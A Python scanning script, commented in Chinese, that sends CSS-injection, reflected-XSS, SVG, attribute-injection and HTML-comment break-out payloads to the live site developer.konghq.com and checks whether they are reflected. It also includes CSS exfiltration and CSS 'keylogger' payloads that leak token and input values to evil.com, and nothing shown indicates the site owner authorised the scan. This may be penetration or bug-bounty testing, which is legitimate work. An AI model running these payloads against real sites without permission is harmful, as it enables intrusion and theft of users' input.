#!/usr/bin/env python3
"""
KongHQ CSS攻击和HTML注入测试
1. CSS Injection (样式注入)
2. HTML Injection via parameters
3. CSS Exfiltration (数据窃取)
4. SVG XSS
5. CSS Keylogger
"""
import requests
from urllib.parse import urljoin, quote

BASE_URL = 'https://developer.konghq.com'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
}

def test_css_injection():
    """测试CSS注入"""
    
    print("="*80)
    print("测试1: CSS Injection")
    print("="*80)
    
    # CSS注入payloads
    css_payloads = [
        # 隐藏内容
        ('?style=<style>*{display:none}</style>', '隐藏所有内容'),
        
        # 显示隐藏字段
        ('?style=<style>input[type=password]{display:block!important;opacity:1!important}</style>', '显示密码字段'),
        
        # CSS表达式（旧版IE）
        ('?style=<style>body{width:expression(alert(1))}</style>', 'CSS表达式'),
        
        # URL重定向
        ('?style=<style>body{background:url(javascript:alert(1))}</style>', 'JS URL'),
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    for payload, desc in css_payloads:
        print(f"\n[测试] {desc}")
        print(f"  Payload: {payload[:60]}...")
        
        try:
            url = BASE_URL + '/plugins/' + payload
            resp = session.get(url, timeout=10)
            
            # 检查CSS是否被反射
            if '<style>' in resp.text:
                print(f"  🔴 CSS被反射到页面中！")
                
                # 检查是否被转义
                if '&lt;style&gt;' in resp.text or '&gt;' in resp.text:
                    print(f"  ✅ 但被HTML实体转义")
                else:
                    print(f"  🔴🔴 未被转义，可能可执行！")
            else:
                print(f"  ✅ CSS未被反射")
                
        except Exception as e:
            print(f"  ❌ 错误: {e}")

def test_html_injection():
    """测试HTML注入"""
    
    print("\n" + "="*80)
    print("测试2: HTML Injection")
    print("="*80)
    
    # HTML注入payloads
    html_payloads = [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<div style="background:url(javascript:alert(1))">',
        '<iframe src="javascript:alert(1)">',
        '<details open ontoggle=alert(1)>',
    ]
    
    # 常见的参数名
    param_names = ['q', 'search', 'query', 'filter', 'keyword', 's', 'text']
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    found_reflections = []
    
    for param in param_names:
        for payload in html_payloads[:2]:  # 只测试前2个payload
            test_url = f"{BASE_URL}/plugins/?{param}={quote(payload)}"
            
            try:
                resp = session.get(test_url, timeout=10)
                
                # 检查payload是否被反射
                if payload.split('=')[0] in resp.text:
                    print(f"\n⚠️  参数 '{param}' 反射了用户输入")
                    
                    # 检查是否被正确转义
                    if '<' in resp.text and '>' in resp.text:
                        # 检查标签是否完整
                        import re
                        tags = re.findall(r'<\w+[^>]*>', resp.text)
                        
                        # 看是否有我们注入的标签
                        injected_tag = payload.split()[0]
                        if any(injected_tag in tag for tag in tags):
                            print(f"  🔴 HTML标签未被转义！")
                            found_reflections.append((param, payload))
                        else:
                            print(f"  ✅ 标签被过滤或转义")
                    else:
                        print(f"  ✅ 特殊字符被转义")
                
            except:
                pass
    
    if found_reflections:
        print(f"\n🔴 发现 {len(found_reflections)} 个可能的HTML注入点")
        for param, payload in found_reflections:
            print(f"  • 参数: {param}, Payload: {payload}")
    else:
        print("\n✅ 未发现HTML注入")

def test_css_exfiltration():
    """测试CSS数据窃取"""
    
    print("\n" + "="*80)
    print("测试3: CSS Exfiltration (属性选择器)")
    print("="*80)
    
    # CSS属性选择器payload - 尝试窃取token
    css_exfil_payload = '''
    <style>
    input[name*="token"] { background: url(http://evil.com/steal?attr=name); }
    input[value^="a"] { background: url(http://evil.com/steal?val=a); }
    input[value^="b"] { background: url(http://evil.com/steal?val=b); }
    </style>
    '''
    
    print("\n[测试] CSS属性选择器数据窃取")
    print(f"  Payload长度: {len(css_exfil_payload)} chars")
    
    try:
        url = BASE_URL + '/plugins/?style=' + quote(css_exfil_payload)
        resp = requests.get(url, headers=HEADERS, timeout=10)
        
        if '<style>' in resp.text and 'url(http://evil.com' in resp.text:
            print(f"  🔴 CSS exfiltration payload被反射！")
            print(f"  ⚠️  如果有敏感输入字段，可能被窃取")
        else:
            print(f"  ✅ Payload未被反射或被转义")
            
    except Exception as e:
        print(f"  ❌ 错误: {e}")

def test_svg_xss():
    """测试SVG XSS"""
    
    print("\n" + "="*80)
    print("测试4: SVG XSS")
    print("="*80)
    
    # SVG XSS payloads
    svg_payloads = [
        '<svg onload=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
        '<svg><animate onbegin=alert(1) attributeName=x>',
        '<svg><set onbegin=alert(1) attributeName=x>',
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    for payload in svg_payloads:
        print(f"\n[测试] SVG: {payload[:40]}...")
        
        try:
            url = BASE_URL + '/?q=' + quote(payload)
            resp = session.get(url, timeout=10)
            
            # 检查SVG是否被反射
            if '<svg' in resp.text:
                print(f"  ⚠️  SVG标签被反射")
                
                # 检查onload等事件处理器
                if 'onload=' in resp.text or 'onbegin=' in resp.text:
                    print(f"  🔴 事件处理器未被过滤！")
                else:
                    print(f"  ✅ 事件处理器被过滤")
            else:
                print(f"  ✅ SVG未被反射")
                
        except:
            pass

def test_css_keylogger():
    """测试CSS键盘记录器"""
    
    print("\n" + "="*80)
    print("测试5: CSS Keylogger")
    print("="*80)
    
    # CSS keylogger payload
    keylogger_payload = '''
    <style>
    input { background-image: url('http://evil.com/log?key='); }
    input[value$="a"] { background-image: url('http://evil.com/log?ends=a'); }
    input[value$="b"] { background-image: url('http://evil.com/log?ends=b'); }
    </style>
    '''
    
    print("\n[测试] CSS键盘记录器")
    
    try:
        url = BASE_URL + '/plugins/?custom_css=' + quote(keylogger_payload)
        resp = requests.get(url, headers=HEADERS, timeout=10)
        
        if 'background-image: url' in resp.text and 'evil.com' in resp.text:
            print(f"  🔴 Keylogger payload被反射！")
            print(f"  ⚠️  可以记录用户输入")
        else:
            print(f"  ✅ Payload被过滤或转义")
            
    except Exception as e:
        print(f"  ❌ 错误: {e}")

def test_html_comment_injection():
    """测试HTML注释注入"""
    
    print("\n" + "="*80)
    print("测试6: HTML注释注入")
    print("="*80)
    
    # 注释注入可以破坏页面结构
    comment_payload = '--><script>alert(1)</script><!--'
    
    print(f"\n[测试] 注释突破: {comment_payload}")
    
    try:
        url = BASE_URL + '/?q=' + quote(comment_payload)
        resp = requests.get(url, headers=HEADERS, timeout=10)
        
        # 检查是否突破了注释
        if '--><script>' in resp.text:
            print(f"  🔴 成功突破HTML注释！")
        elif '&gt;--&gt;' in resp.text:
            print(f"  ✅ 被正确转义")
        else:
            print(f"  ✅ 未检测到注释突破")
            
    except Exception as e:
        print(f"  ❌ 错误: {e}")

def test_attribute_injection():
    """测试属性注入"""
    
    print("\n" + "="*80)
    print("测试7: 属性注入")
    print("="*80)
    
    # 尝试注入HTML属性
    attr_payloads = [
        '" onclick="alert(1)" "',
        '" onmouseover="alert(1)" "',
        '"><img src=x onerror=alert(1)>"',
    ]
    
    session = requests.Session()
    session.headers.update(HEADERS)
    
    for payload in attr_payloads:
        print(f"\n[测试] 属性注入: {payload[:30]}...")
        
        try:
            url = BASE_URL + '/plugins/?filter=' + quote(payload)
            resp = session.get(url, timeout=10)
            
            # 检查onclick等事件是否被反射
            if 'onclick=' in resp.text or 'onerror=' in resp.text:
                print(f"  🔴 事件处理器被反射！")
            else:
                print(f"  ✅ 事件处理器被过滤")
                
        except:
            pass

if __name__ == '__main__':
    print("="*80)
    print(" KongHQ CSS攻击和HTML注入测试")
    print("="*80)
    
    # 执行所有测试
    test_css_injection()
    test_html_injection()
    test_css_exfiltration()
    test_svg_xss()
    test_css_keylogger()
    test_html_comment_injection()
    test_attribute_injection()
    
    print("\n" + "="*80)
    print(" 测试完成")
    print("="*80)
    print("\n说明:")
    print("  • CSS/HTML注入通常需要配合XSS才能利用")
    print("  • 如果只是反射但被转义，无法利用")
    print("  • 需要手动验证浏览器中的实际效果")
